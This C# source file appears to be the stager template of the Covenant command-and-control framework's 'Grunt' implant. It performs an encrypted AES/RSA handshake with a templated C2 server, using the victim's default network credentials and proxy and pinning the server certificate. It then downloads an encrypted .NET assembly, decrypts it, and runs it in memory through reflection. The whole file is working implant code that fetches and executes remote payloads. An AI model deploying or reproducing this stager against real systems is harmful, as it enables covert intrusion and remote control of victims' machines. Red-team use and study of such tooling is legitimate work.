using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace Grunt
{
    public class GruntStager
    {
        public GruntStager()
        {
            ExecuteStager();
        }
        public static void Main()
        {
            new GruntStager();
        }
        public static void Execute()
        {
            new GruntStager();
        }
        public void ExecuteStager()
        {
            try
            {
                string CovenantURI = @"{{REPLACE_COVENANT_URI}}";
                string CovenantCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
                List<string> ProfileHttpHeaderNames = new List<string>();
                List<string> ProfileHttpHeaderValues = new List<string>();
                // {{REPLACE_PROFILE_HTTP_HEADERS}}
                List<string> ProfileHttpUrls = new List<string>();
                // {{REPLACE_PROFILE_HTTP_URLS}}
                string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}";
                string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}";

                Random randomUrl = new Random();
                int Id = Convert.ToInt32(@"{{REPLACE_GRUNT_ID}}");
                string Name = @"{{REPLACE_GRUNT_NAME}}";
                byte[] SetupKeyBytes = Convert.FromBase64String(@"{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}");
                string MessageFormat = @"{{ ""Id"": {0}, ""Name"": ""{1}"", ""Type"": {2}, ""IV"": ""{3}"", ""EncryptedMessage"": ""{4}"", ""HMAC"": ""{5}"" }}";

                Aes SetupAESKey = Aes.Create();
                SetupAESKey.Mode = CipherMode.CBC;
                SetupAESKey.Padding = PaddingMode.PKCS7;
                SetupAESKey.Key = SetupKeyBytes;
                SetupAESKey.GenerateIV();
                HMACSHA256 hmac = new HMACSHA256(SetupKeyBytes);
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048, new CspParameters());

                byte[] RSAPublicKeyBytes = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));
                byte[] EncryptedRSAPublicKey = SetupAESKey.CreateEncryptor().TransformFinalBlock(RSAPublicKeyBytes, 0, RSAPublicKeyBytes.Length);
                byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);

                string Stage0Body = String.Format(MessageFormat, Id, Name, "0", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));
                CookieWebClient wc = new CookieWebClient();
                wc.UseDefaultCredentials = true;
                wc.Proxy = WebRequest.DefaultWebProxy;
                wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                wc.DownloadString(CovenantURI + ProfileHttpUrls[randomUrl.Next(ProfileHttpUrls.Count)]);
                for(int i = 0; i < ProfileHttpHeaderValues.Count; i++) { wc.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]); }
                if (CovenantCertHash != "")
                {
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                    ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                    {
                        return cert.GetCertHashString() == CovenantCertHash;
                    };
                }
                string transformedResponse = HttpMessageTransform.Transform(Encoding.UTF8.GetBytes(Stage0Body));
                string Stage0Response = wc.UploadString(CovenantURI + ProfileHttpUrls[randomUrl.Next(ProfileHttpUrls.Count)], String.Format(ProfileHttpPostRequest, transformedResponse)).Replace("\"", "");
				string extracted = Parse(Stage0Response, ProfileHttpPostResponse);
                extracted = Encoding.UTF8.GetString(HttpMessageTransform.Invert(extracted));
                string Gid = extracted.Substring(0, extracted.IndexOf(","));
                Id = Convert.ToInt32(Gid);
                string cut = extracted.Substring(Gid.Length + 1);
                Name = cut.Substring(0, cut.IndexOf(","));
                cut = cut.Substring(Name.Length + 1);
                string iv64str = cut.Substring(0, cut.IndexOf(","));
                cut = cut.Substring(iv64str.Length + 1);
                string message64str = cut.Substring(0, cut.IndexOf(","));
                string hash64str = cut.Substring(message64str.Length + 1);
                byte[] messageBytes = Convert.FromBase64String(message64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }

                SetupAESKey.IV = Convert.FromBase64String(iv64str);
                byte[] PartiallyDecrypted = SetupAESKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                byte[] FullyDecrypted = rsa.Decrypt(PartiallyDecrypted, true);

                Aes SessionKey = Aes.Create();
                SessionKey.Mode = CipherMode.CBC;
                SessionKey.Padding = PaddingMode.PKCS7;
                SessionKey.Key = FullyDecrypted;
                SessionKey.GenerateIV();
                hmac = new HMACSHA256(SessionKey.Key);

                byte[] challenge1 = new byte[4];
                RandomNumberGenerator rng = RandomNumberGenerator.Create();
                rng.GetBytes(challenge1);
                byte[] EncryptedChallenge1 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge1, 0, challenge1.Length);
                hash = hmac.ComputeHash(EncryptedChallenge1);

                for(int i = 0; i < ProfileHttpHeaderValues.Count; i++) { wc.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]); }
                string Stage1Body = String.Format(MessageFormat, Id, Name, "1", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge1), Convert.ToBase64String(hash));
                transformedResponse = HttpMessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));
                string Stage1Response = wc.UploadString(CovenantURI + ProfileHttpUrls[randomUrl.Next(ProfileHttpUrls.Count)], String.Format(ProfileHttpPostRequest, transformedResponse)).Replace("\"", "");
                extracted = Parse(Stage1Response, ProfileHttpPostResponse);
                extracted = Encoding.UTF8.GetString(HttpMessageTransform.Invert(extracted));
                iv64str = extracted.Substring(0, extracted.IndexOf(","));
                cut = extracted.Substring(iv64str.Length + 1);
                message64str = cut.Substring(0, cut.IndexOf(","));
                hash64str = extracted.Substring(iv64str.Length + message64str.Length + 2);

                messageBytes = Convert.FromBase64String(message64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
                SessionKey.IV = Convert.FromBase64String(iv64str);

                byte[] DecryptedChallenges = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                byte[] challenge1Test = new byte[4];
                byte[] challenge2 = new byte[4];
                Buffer.BlockCopy(DecryptedChallenges, 0, challenge1Test, 0, 4);
                Buffer.BlockCopy(DecryptedChallenges, 4, challenge2, 0, 4);
                if (Convert.ToBase64String(challenge1) != Convert.ToBase64String(challenge1Test)) { return; }

                SessionKey.GenerateIV();
                byte[] EncryptedChallenge2 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge2, 0, challenge2.Length);
                hash = hmac.ComputeHash(EncryptedChallenge2);

                for(int i = 0; i < ProfileHttpHeaderValues.Count; i++) { wc.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]); }
                string Stage2Body = String.Format(MessageFormat, Id, Name, "2", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge2), Convert.ToBase64String(hash));
                transformedResponse = HttpMessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));
                string Stage2Response = wc.UploadString(CovenantURI + ProfileHttpUrls[randomUrl.Next(ProfileHttpUrls.Count)], String.Format(ProfileHttpPostRequest, transformedResponse)).Replace("\"", "");
                extracted = Parse(Stage2Response, ProfileHttpPostResponse);
                extracted = Encoding.UTF8.GetString(HttpMessageTransform.Invert(extracted));
                iv64str = extracted.Substring(0, extracted.IndexOf(","));
                cut = extracted.Substring(iv64str.Length + 1);
                message64str = cut.Substring(0, cut.IndexOf(","));
                hash64str = extracted.Substring(iv64str.Length + message64str.Length + 2);
                messageBytes = Convert.FromBase64String(message64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }

                SessionKey.IV = Convert.FromBase64String(iv64str);
                byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
                gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { SessionKey });
            }
            catch (Exception e) { Console.Error.WriteLine(e.Message); }
        }

        public class CookieWebClient : WebClient
        {
            public CookieContainer CookieContainer { get; private set; }
            public CookieWebClient()
            {
                this.CookieContainer = new CookieContainer();
            }
            protected override WebRequest GetWebRequest(Uri address)
            {
                var request = base.GetWebRequest(address) as HttpWebRequest;
                if (request == null) return base.GetWebRequest(address);
                request.CookieContainer = CookieContainer;
                return request;
            }
        }

        private static string Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{");
            format = format.Replace("{0}", string.Format("(?'group{0}'.*)", 0));
            Match match = new Regex(format).Match(data);
            return match.Groups["group0"].Value;
        }
        
        private static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }

		// {{REPLACE_PROFILE_HTTP_TRANSFORM}}
    }
}